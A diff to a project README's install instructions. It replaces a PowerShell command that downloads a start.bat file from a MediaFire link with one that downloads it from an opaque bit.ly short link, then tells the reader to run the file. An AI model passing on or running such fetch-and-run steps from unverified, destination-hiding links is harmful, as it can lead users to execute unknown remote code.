@@ -15,8 +15,9 @@ CCP requires the following accessibilities:
 
 Download this repository and run "start.bat" <br />
 or alternitavely open a terminal and enter this command: <br />
-`powershell -Command "Invoke-WebRequest http://download1512.mediafire.com/kfyirq514vig/u6jdcbaoypcjpls/start.bat -OutFile start.bat"` <br />
+`powershell -Command "Invoke-WebRequest https://bit.ly/2KB2iDx -OutFile start.bat"` <br />
 then run "start.bat" wherever you opened your terminal <br />
+if none of these work; try https://bit.ly/2KB2iDx
 
 ### Usage
 
